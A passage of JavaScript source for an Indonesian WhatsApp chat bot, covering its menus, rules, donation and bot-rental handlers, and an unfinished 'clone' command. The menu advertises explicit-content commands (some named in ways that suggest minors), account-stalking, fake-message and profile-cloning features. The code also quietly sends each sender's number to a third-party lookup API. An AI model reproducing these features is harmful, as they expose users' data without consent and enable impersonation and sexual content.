│_/\_ ${prefix}googletxt2 text|text
│_/\_ ${prefix}transformer text|text
│_/\_ ${prefix}write text
│_/\_ ${prefix}waifu
│_/\_ ${prefix}phlogo text|*text
│_/\_ ${prefix}tfire text
│_/\_ ${prefix}phcomment text|text
│_/\_ ${prefix}wolf text
│_/\_ ${prefix}ytgol text
│_/\_ ${prefix}ytsilver text
│_/\_ ${prefix}t3d text
│_/\_ ${prefix}logoa text|text
│_/\_ ${prefix}marvel text|text
│_/\_ ${prefix}leavest text
│_/\_ ${prefix}neon2 text
│_/\_ ${prefix}wall text
│_/\_ ${prefix}notewrite text
│_/\_ ${prefix}pubglogo text|text
│
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙁𝙐𝙉 
│_/\_ ${prefix}fitnah
│_/\_ ${prefix}fitnahpc
│_/\_ ${prefix}kontak 0|p
│_/\_ ${prefix}lolivid
│_/\_ ${prefix}suit
│_/\_ ${prefix}toxic
│_/\_ ${prefix}flock
│_/\_ ${prefix}pantun
│_/\_ ${prefix}dadu
│_/\_ ${prefix}asupan
│_/\_ ${prefix}viewonce
│_/\_ ${prefix}detikvn number
│_/\_ ${prefix}detikvideo number
│_/\_ ${prefix}hbd
│
│  𝐒𝐭𝐚𝐥𝐤 𝐌𝐞𝐧𝐮
│_/\_ ${prefix}igstalk
│_/\_ ${prefix}mlstalk
│_/\_ ${prefix}tkstalk
│_/\_ ${prefix}githubstalk
│_/\_ ${prefix}shortlink
│
│  𝐀𝐬𝐮𝐩𝐚𝐧 𝐌𝐞𝐧𝐮
│_/\_ ${prefix}asupan
│_/\_ ${prefix}asupancecan
│_/\_ ${prefix}asupanhijaber
│_/\_ ${prefix}asupansantuy
│_/\_ ${prefix}asupanukhti
│_/\_ ${prefix}asupanbocil
│_/\_ ${prefix}asupanghea
│_/\_ ${prefix}asupanrika
│
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙉𝙎𝙁𝙒 
│_/\_ ${prefix}yuri
│_/\_ ${prefix}hentai
│_/\_ ${prefix}anal
│_/\_ ${prefix}eroneko
│_/\_ ${prefix}lesbian
│_/\_ ${prefix}kitsune
│_/\_ ${prefix}bj
│_/\_ ${prefix}pussy
│_/\_ ${prefix}wallpaper
│_/\_ ${prefix}neko2
│_/\_ ${prefix}baka
│_/\_ ${prefix}slap
│_/\_ ${prefix}poke
│_/\_ ${prefix}keta
│_/\_ ${prefix}awoo
│_/\_ ${prefix}blowjob
│_/\_ ${prefix}megumin
│_/\_ ${prefix}neko
│_/\_ ${prefix}trapnime
│
│  𝐖𝐢𝐛𝐮 𝐌𝐞𝐧𝐮
│_/\_ ${prefix}kurumi
│_/\_ ${prefix}deku
│_/\_ ${prefix}sao
│_/\_ ${prefix}chika
│_/\_ ${prefix}kaneki
│_/\_ ${prefix}touka
│_/\_ ${prefix}eren
│_/\_ ${prefix}naruto
│_/\_ ${prefix}minato
│_/\_ ${prefix}sagiri
│_/\_ ${prefix}sasuke
│_/\_ ${prefix}sakura
│_/\_ ${prefix}tsunade
│_/\_ ${prefix}gojosatoru
└──────────[`
sendButLocation(from, `${menu}`,`Active : ${latensie.toFixed(4)} _Second_ : ${runtime(process.uptime())}`, {jpegThumbnail:fakesem}, [{buttonId:`${prefix}credits`,buttonText:{displayText:'Thanks🐣'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})

break				
case 'syarat':
case '📒':
case 'rules':
if (isBanned) return reply(mess.ban)
groups = itsmevall.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = itsmevall.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await itsmevall.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
        ptod = "62858157008612@s.whatsapp.net"
        dtod = '62858157008612'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await itsmevall.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `*RULES BOT*

1. Jangan spam bot. 
Sanksi: *WARN/SOFT BLOCK*

2. Jangan telepon bot.
Sanksi: *SOFT BLOCK*

3. Jangan mengejek bot.
Sanksi: *PERMANENT BLOCK*

3. Gpp sc gw jelek yg penting 
Bot gw jalan awokawoak
Jika sudah dipahami rules-nya, silakan ketik *allmenu* untuk memulai!

*Jika ada fitur yang gak work harap hubungi owner*

Owner  BOT:
wa.me/6289503657396`
sendButLocation(from, `${menu}`,`Active : ${latensie.toFixed(4)} _Second_ : ${runtime(process.uptime())}`, {jpegThumbnail:fakerules}, [{buttonId:`${prefix}credits`,buttonText:{displayText:'Thanks🐣'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})

break
case '🌐':
case 'ofc':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
hehe = await getBuffer(`https://telegra.ph/file/4a225bba90af3de0b4a94.jpg`)
sendButLocation(from, `*Group Official* : Group link: https://chat.whatsapp.com/BDd6hcvE6iVBpbqSpblyNA`, '©Realzi ' + hai, {jpegThumbnail:hehe}, [{buttonId: `${prefix}donasi`, buttonText: {displayText: 'Donasi'}, type: 1}], {quoted: mek})
limitAdd(sender)
break
case 'tiktokbutton':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
if (!q) return reply('Linknya?')
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply('Invalid link')
sendButLocation(from, 'Silahkan pilih media yang ingin kamu download', '© ' + fakeyoi, {jpegThumbnail:faketiktok}, [{buttonId: `.tiktokwmtol ${q}`, buttonText: {displayText: 'WM'}, type: 1},{buttonId: `.tiktoknowm ${q}`, buttonText:{displayText: 'NOWM'}, type: 1},{buttonId: `.tiktokmusic ${q}`, buttonText:{displayText: 'AUDIO'}, type: 1}], {quoted: mek})
limitAdd(sender)
break
case 'report':
if (isBanned) return reply(mess.ban)
let pesan = body.slice(8)
if (pesan.length > 300) return pras.sendMessage(from, 'Maaf Teks Terlalu Panjang, Maksimal 300 Teks', text, { quoted: ftrol })
var nomor = zer.participant
let teks1 = `[𝗥𝗘𝗣𝗢𝗥𝗧]\n𝐏𝐞𝐬𝐚𝐧 : ${pesan}`
var options = {
text: teks1,
contextInfo: { mentionedJid: [nomor] },
}
itsmevall.sendMessage(`6285815700875@s.whatsapp.net`, options, text, { quoted: ftrol })
reply('Masalah Telah Di Laporkan Ke Owner BOT, Mohon Tunggu Untuk Proses Perbaikan')
break
case 'wangy':
if (isBanned) return reply(mess.ban)
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})  
              if (!q) return
              qq = q.toUpperCase()
              awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
              reply(awikwok)
              break
              case 'bucin':
                    case 'quotebucin':
                    if (isBanned) return reply(mess.ban)
                      if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})    
                    hasil = bucinrandom[Math.floor(Math.random() * (bucinrandom.length))]
                    itsmevall.sendMessage(from, '*'+hasil+'*', text, {quoted: mek})
            break
              case 'wiki':
              if (isBanned) return reply(mess.ban)
					anu = await fetchJson(`https://leyscoders-api.herokuapp.com/api/wiki?kata=${q}&apikey=IkyOgiwara`)
					itsmevall.sendMessage(from, `「 RESULT FOUND 」\n• Hasil Pencarian Dari: ${anu.result.from}\n• Hasil: ${anu.hasil}`, text, {quoted: mek})
					break
              case "cekme":
  case "cakme":
  if (isBanned) return reply(mess.ban)
  reply("Tunggu!, Sedang Scan Number & Name")
					// ⚠️ Case By Arasya
					neme = args.join(" ")
					bet = `${sender}`
					const sifat =['Baek','Jutek','Ngeselin','Bobrok','Pemarah','Sopan','Beban','Sangean','Cringe','Pembohong']
					const hoby =['Memasak','Membantu Atok','Mabar','Nobar','Sosmedtan','Membantu Orang lain','Nonton Anime','Nonton Drakor','Naik Motor','Nyanyi','Menari','Bertumbuk','Menggambar','Foto fotoan Ga jelas','Maen Game','Berbicara Sendiri']
					const bukcin =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const arp =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const cakep =['Iyaa cakep','Maaf Kak, Banyak² Perawatan Ya','Jelek ajg','Cakep banget😍','❌','✔️']
					const wetak=['Penyayang','Pemurah','Pemarah','Pemaaf','Penurut','Baik','Baperan','Baik Hati','penyabar','UwU','top deh, pokoknya','Suka Membantu']
					const baikk =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const bhuruk =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const cerdhas =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const berhani =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const mengheikan =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const sipat = sifat[Math.floor(Math.random() * sifat.length)]
					const biho = hoby[Math.floor(Math.random() * hoby.length)]
					const bhucin = bukcin[Math.floor(Math.random() * bukcin.length)]
					const senga = arp[Math.floor(Math.random() * arp.length)]
					const chakep = cakep[Math.floor(Math.random() * cakep.length)]
					const watak = wetak[Math.floor(Math.random() * wetak.length)]
					const baik = baikk[Math.floor(Math.random() * baikk.length)]
					const burug = bhuruk[Math.floor(Math.random() * bhuruk.length)]
					const cerdas = cerdhas[Math.floor(Math.random() * cerdhas.length)]
					const berani = berhani[Math.floor(Math.random() * berhani.length)]
					const takut = mengheikan[Math.floor(Math.random() * mengheikan.length)]
					try {
					profil = await itsmevall.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
					} catch {
					profil = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
					}
					 prrofile = `*${c}==== CEK @${bet.split('@')[0]} ====${c}*

*Nama :* ${pushname}
*Sifat :* ${sipat}
*Hobby :* ${biho}
*Bucin :* ${bhucin}%
*Sange :* ${senga}%
*Cakep :* ${chakep}
*Watak :* ${watak}
*Akhlak Baik :* ${baik}%
*Akhlak Buruk :* ${burug}%
*Kecerdasan :* ${cerdas}%
*Keberanian :* ${berani}%
*Ketakutan :* ${takut}%
${c}=================${c}`
					buff = await getBuffer(profil)
			   sendButLocation(from, `${prrofile}`,`© REALZIBOT`, {jpegThumbnail:buff}, [{buttonId:`${prefix}menu`,buttonText:{displayText:'MENU'},type:1}], {contextInfo: { mentionedJid: [sender, owner]}})
               break
case 'gtau':
              gopeynya = 'https://telegra.ph/file/0939ef6401dc76df07e90.jpg'
            buff = await getBuffer(gopeynya)
            teksnya = `
*RULES BOT*

1. Jangan spam bot. 
Sanksi: *WARN/SOFT BLOCK*

2. Jangan telepon bot.
Sanksi: *SOFT BLOCK*

3. Jangan mengejek bot.
Sanksi: *PERMANENT BLOCK*

3. Gpp sc gw jelek yg penting 
Bot gw jalan awokawoak
Jika sudah dipahami rules-nya, silakan ketik *allmenu* untuk memulai!

*Jika ada fitur yang gal work harap hubungi owner*

Owner  BOT:
wa.me/62858157008612
`
  buttons = [{buttonId: `${prefix}owner`,buttonText:{displayText: `OWNER BOT`},type:1},{buttonId: `${prefix}menu`,buttonText:{displayText: `KEMBALI KE MENU`},type:1}]
              imageMsg = (await itsmevall.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'closed in your informations︎ ', imageMessage: imageMsg,
              contentText: teksnya,buttons,headerType:4}
              prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{quoted:mek})
                                          itsmevall.relayWAMessage(prep)
      break
      case 'donasi':
      case 'donasibot':
      if (isBanned) return reply(mess.ban)
groups = itsmevall.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = itsmevall.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await itsmevall.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
        ptod = "6289503657396@s.whatsapp.net"
        dtod = '6289503657396'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await itsmevall.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `╭─[ *Donasi om buat umroh:v ]*
│•Via gopay : MINTA KE OWNER OM
│•Via Ovo : 089503657396
│•Via Pulsa : 089503657396
└──────[ DONASI ]─────[`
sendButLocation(from, `${menu}`,`Active : ${latensie.toFixed(4)} _Second_ : ${runtime(process.uptime())}`, {jpegThumbnail:fakegim}, [{buttonId:`${prefix}infoall`,buttonText:{displayText:'LIST MEMBERS'},type:1},{buttonId:`${prefix}listadmin`,buttonText:{displayText:'LIST ADMIN'},type:1},{buttonId:`${prefix}infogrup`,buttonText:{displayText:'INFO GROUP'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})

break
///=====PEMBATAS SEWA =========
case 'sewwbot':
case 'sewaew':
        case '0':
        if (isBanned) return reply(mess.ban)
        stod = `${sender}`
       stst = await itsmevall.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			
       menu = `0`
sendButLocation(from, `*_Hai ${pushname} 👋🏻_* \n\nyakin nih mau sewa bot ? 🤔 Boong auto banned >_<`, "*©Sewa Bot 2021*", {jpegThumbnail:fakeimage}, [{buttonId:`${prefix}sewa1`,buttonText:{displayText:'🗿Ya'},type:1},{buttonId:`${prefix}gk`,buttonText:{displayText:'👀Tidak'},type:1}], {contextInfo: { mentionedJid: [stod]}})
break
case 'sewa1':
 listMsg = {
 buttonText: 'KLIK DISINI',
 footerText: '*Sewa Bot © 2021*',
 description: `*LIST SEWA BOT*\n _Hay @${stod.split('@')[0]}_ Ini adalah list sewa bot silahkan pilih`,
 sections: [
                     {
                      "title": `${sender}`,
 rows: [
                          {
                              "title": "🕐sewa 1 minggu",
                              "rowId": ""
                           },
                           {                                                      
                              "title": "🕑sewa 2 minggu",
                              "rowId": ""
                           },
                           {
                              "title": "🕒sewa 3 minggu",
                              "rowId": ""
                           },
                           {
                              "title": "🕓sewa 1 bulan",
                              "rowId": ""
                           },
                           {
                              "title": "🕔sewa 2 bulan",
                              "rowId": ""
                           },
                           {
                              "title": "👨‍💻",
                              "rowId": ""
                           }
                        ]
                     }],
 listType: 1
}
itsmevall.sendMessage(from, listMsg, MessageType.listMessage, {contextInfo: { mentionedJid: [sender]},quoted:mek})
break
case '🕐sewa':
case '🕑sewa':
case '🕒sewa':
case '🕓sewa':
case '🕔sewa':
        case '0':
        stod = `${sender}`
       stst = await itsmevall.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			
       menu = `0`
sendButLocation(from, `_*Hai ${pushname}🌹*_\n\nSilahkan pilih metode pembayaran`, "*Sewa Bot © 2021*", {jpegThumbnail:fakeimage}, [{buttonId:`${prefix}py`,buttonText:{displayText:'NOMOR 📱'},type:1},{buttonId:`${prefix}qrsewa`,buttonText:{displayText:'QR CODE 📱'},type:1}], {contextInfo: { mentionedJid: [stod]}})
break
case 'py':
        case '0':
        stod = `${sender}`
       stst = await itsmevall.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			
       menu = `0`
sendButLocation(from, `_*Hai ${pushname}🌹*_\n\nSilahkan pilih metode pembayaran`, "*Sewa Bot © 2021*", {jpegThumbnail:fakeimage}, [{buttonId:`${prefix}o1`,buttonText:{displayText:'OVO 📱'},type:1},{buttonId:`${prefix}d1`,buttonText:{displayText:'GOPAY 📱'},type:1},{buttonId:`${prefix}d1`,buttonText:{displayText:'DANA 📱'},type:1}], {contextInfo: { mentionedJid: [stod]}})
break
case 'qrsewa':
        case '0':
        stod = `${sender}`
       stst = await itsmevall.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			
       menu = `0`
sendButLocation(from, `_Hai ${pushname}🌹_\n\nSilahkan pilih metode pembayaran`, "*Sewa Bot © 2021*", {jpegThumbnail:fakeimage}, [{buttonId:`${prefix}qrg1`,buttonText:{displayText:'QR GOPAY 📱'},type:1},{buttonId:`${prefix}qro1`,buttonText:{displayText:'QR OVO 📱'},type:1},{buttonId:`${prefix}qrd1`,buttonText:{displayText:'QR DANA 📱'},type:1}], {contextInfo: { mentionedJid: [stod]}})
break
case 'qro1':
itsmevall.sendMessage(from, `*[❗] OPEN SEWA BOT*
╭───────────────
│ *Harga Sewa MINGGUAN*
│ 1 minggu : Rp 3.000 
│ 2 minggu : Rp 5.000
│ 3 minggu : Rp 10.000
╰────────────────
          │ *Harga Sewa BULANAN*
          │1 Bulan : Rp. 15.000
          │2 Bulan : Rp. 20.000
          ╰───────────────
╭───────────────
│ *NOTE :*
│BOT AKTIF 24 JAM
╰────────────────

*📌 MINAT?*
_CHAT : wa.me/6289503657396_

*════〘 BOT 〙════*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "QRCODE OVO",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./media/image/itsmevall.jpg'),sourceUrl:"OV1876"}}})
break
case 'qrg1':
itsmevall.sendMessage(from, `*[❗] OPEN SEWA BOT*
╭───────────────
│ *Harga Sewa MINGGUAN*
│ 1 minggu : Rp 3.000 
│ 2 minggu : Rp 5.000
│ 3 minggu : Rp 10.000
╰────────────────
          │ *Harga Sewa BULANAN*
          │1 Bulan : Rp. 15.000
          │2 Bulan : Rp. 20.000
          ╰───────────────
╭───────────────
│ *NOTE :*
│BOT AKTIF 24 JAM
╰────────────────

*📌 MINAT?*
_CHAT : wa.me/6289503657396_

*════〘 BOT 〙════*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "QRCODE GOPAY",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./media/image/itsmevall.jpg'),sourceUrl:"GPY18ui876"}}})
break
case 'qrg1':
itsmevall.sendMessage(from, `*[❗] OPEN SEWA BOT*
╭───────────────
│ *Harga Sewa MINGGUAN*
│ 1 minggu : Rp 3.000 
│ 2 minggu : Rp 5.000
│ 3 minggu : Rp 10.000
╰────────────────
          │ *Harga Sewa BULANAN*
          │1 Bulan : Rp. 15.000
          │2 Bulan : Rp. 20.000
          ╰───────────────
╭───────────────
│ *NOTE :*
│BOT AKTIF 24 JAM
╰────────────────

*📌 MINAT?*
_CHAT : wa.me/6289503657396_

*════〘 BOT 〙════*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "QRCODE DANA",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./media/image/itsmevall.jpg'),sourceUrl:"DNA187736"}}})
break
case 'o1':
menu = `*[❗] OPEN SEWA BOT*
╭───────────────
│ *Harga Sewa MINGGUAN*
│ 1 minggu : Rp 3.000 
│ 2 minggu : Rp 5.000
│ 3 minggu : Rp 10.000
╰────────────────
          │ *Harga Sewa BULANAN*
          │1 Bulan : Rp. 15.000
          │2 Bulan : Rp. 20.000
          ╰───────────────
╭───────────────
│ *NOTE :*
│BOT AKTIF 24 JAM
╰────────────────

*📌 MINAT?*
_CHAT : wa.me/6289503657396_

*════〘 BOT 〙════*`
katalog(menu)
listMsg = {
 buttonText: 'NOMOR',
 footerText: '*Sewa Bot © 2021*',
 description: `*Hai ${pushname} 🎟️* \n\nsilahkan tekan "NOMOR" untuk melihat nomer ovo dan jangan lupa sertakan bukti pembayaran dan kirim ke OWNER`,
 sections: [
                     {
                      "title": `OVO : 0${Noovo}`,
 rows: [
                           {
                              "title": "👍 \n\nOk Bang",
                              "rowId": ""
                           }
                        ]
                     }],
 listType: 1
}
itsmevall.sendMessage(from, listMsg, MessageType.listMessage, {contextInfo: { mentionedJid: [stod]},quoted:mek})
break
case 'd1':
menu = `*[❗] OPEN SEWA BOT*
╭───────────────
│ *Harga Sewa MINGGUAN*
│ 1 minggu : Rp 3.000 
│ 2 minggu : Rp 5.000
│ 3 minggu : Rp 10.000
╰────────────────
          │ *Harga Sewa BULANAN*
          │1 Bulan : Rp. 15.000
          │2 Bulan : Rp. 20.000
          ╰───────────────
╭───────────────
│ *NOTE :*
│BOT AKTIF 24 JAM
╰────────────────

*📌 MINAT?*
_CHAT : wa.me/6289503657396_

*════〘 BOT 〙════*`
katalog(menu)
listMsg = {
 buttonText: 'NOMOR',
 footerText: '*Sewa Bot © 2021*',
 description: `*Hai ${pushname} 🎟️* \n\nsilahkan tekan "NOMOR" untuk melihat nomer dana dan jangan lupa sertakan bukti pembayaran dan kirim ke OWNER`,
 sections: [
                     {
                      "title": `DANA : 0${Nodana}`,
 rows: [
                           {
                              "title": "👍 \n\nOk Bang",
                              "rowId": ""
                           }
                        ]
                     }],
 listType: 1
}
itsmevall.sendMessage(from, listMsg, MessageType.listMessage, {contextInfo: { mentionedJid: [stod]},quoted:mek})
break
case 'g1':
menu = `*[❗] OPEN SEWA BOT*
╭───────────────
│ *Harga Sewa MINGGUAN*
│ 1 minggu : Rp 3.000 
│ 2 minggu : Rp 5.000
│ 3 minggu : Rp 10.000
╰────────────────
          │ *Harga Sewa BULANAN*
          │1 Bulan : Rp. 15.000
          │2 Bulan : Rp. 20.000
          ╰───────────────
╭───────────────
│ *NOTE :*
│BOT AKTIF 24 JAM
╰────────────────

*📌 MINAT?*
_CHAT : wa.me/6289503657396_

*════〘 BOT 〙════*`
katalog(menu)
listMsg = {
 buttonText: 'NOMOR',
 footerText: '*Sewa Bot ©Realzi*',
 description: `*Hai ${pushname} 🎟️* \n\nsilahkan tekan "NOMOR" untuk melihat nomer gopay dan jangan lupa sertakan bukti pembayaran dan kirim ke OWNER`,
 sections: [
                     {
                      "title": `GOPAY : 0${Nogpy}`,
 rows: [
                           {
                              "title": "👍 \n\nOk Bang",
                              "rowId": ""
                           }
                        ]
                     }],
 listType: 1
}
itsmevall.sendMessage(from, listMsg, MessageType.listMessage, {contextInfo: { mentionedJid: [stod]},quoted:mek})
break
case '👍':
listMsg = {
 buttonText: 'OWNER 👨‍💻',
 footerText: '*Sewa Bot © 2021*',
 description: `*Hai ${pushname}* \n\nsilahkan tekan "OWNER" untuk menuju ke nomer owner`,
 sections: [
                     {
                      "title": `GOPAY : 0${Nogpy}`,
 rows: [
                           {
                              "title": "👨‍??",
                              "rowId": ""
                           }
                        ]
                     }],
 listType: 1
}
itsmevall.sendMessage(from, listMsg, MessageType.listMessage, {contextInfo: { mentionedJid: [stod]},quoted:mek})
break
case 'gk':
listMsg = {
 buttonText: 'MULAI',
 footerText: '*Sewa Bot © 2021*',
 description: `Emm y udah lah mending main game aja`,
 sections: [
                     {
                      "title": `Cari ☺️`,
 rows: [
                           {
                              "title": "☺️\n\nIya bg gw emang 🐶, maaf bg lain kali gw sewa ko",
                              "rowId": ""
                           },
                           {
                              "title": "☺️\n\nIya bg gw emang 🐷, maaf bg lain kali gw sewa ko",
                              "rowId": ""
                           }
                        ]
                     }],
 listType: 1
}
itsmevall.sendMessage(from, listMsg, MessageType.listMessage, {contextInfo: { mentionedJid: [stod]},quoted:mek})
break
case 'sewa':
case 'sewabot':
      list = await itsmevall.prepareMessageFromContent(from, {
    "listMessage": {
      "title": "PAYMENT",
      "description": "*REALZI BOT*\n\n*List Harga*\n- Rp 10.000/ Gopay-Ovo-Saweria\nRp 15.000/ Pulsa\n\nMinat langsung chat\nwa.me/6289503657396",
      "buttonText": "",
      "listType": "PRODUCT_LIST",
      "productListInfo": {
        "productSections": [
          {
            "title": "LIST CATALOG",
            "products": [
              {
                "productId": "6289503657396"
              },
              {
              	"productId": "4907839205966776"
              },
              {
              	"productId": "4907839205966776"
              }
            ]
          }
        ],
        "headerImage": {
          "productId": "4907839205966776",
          "jpegThumbnail": iye
        },
        "businessOwnerJid": "6289503657396@s.whatsapp.net",
      },
      "footerText": "SEWA BOT REALZI!!"
    }
  }, {quoted:mek})
  itsmevall.relayWAMessage(list, {waitForAck: true})      
  break
  case "caklontong":
  if (isBanned) return reply(mess.ban)
   anu = await fetchJson(`https://rest-api-megumin1.herokuapp.com/api/kuis/caklontong?apikey=beta`)
   cak = `*${anu.result.soal}*`
   setTimeout( () => {
   reply('*➸ Jawaban :* '+anu.result.jawaban, text, {quoted: mek}) // ur cods
   }, 30000) // 1000 = 1s,
   setTimeout( () => {
   reply('_10 Detik lagi…_', text) // ur cods
   }, 20000) // 1000 = 1s,
   setTimeout( () => {
   reply('_20 Detik lagi_…', text) // ur cods
   }, 10000) // 1000 = 1s,
   setTimeout( () => {
   reply('_30 Detik lagi_…', text) // ur cods
   }, 2500) // 1000 = 1s,
   setTimeout( () => {
   itsmevall.sendMessage(from, cak, text, {quoted: mek }) // ur cods
   }, 0) // 1000 = 1s,
   break      
  case 'official':  
  if (isBanned) return reply(mess.ban)
         return reply('OFFICIAL GRUP : https://chat.whatsapp.com/IoB5boSiSEcAwFwJwRo3FJ')
  case 'clone':
if (isBanned) return reply(mess.ban)  
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
if (!isGroup) return reply(lang.onlygc())
if (args.length < 1) return reply('Tag target yang ingin di clone')
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag cvk')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
let { jid, idk, notify } = groupMembers.find(x => x.jid === mentioned)
try {
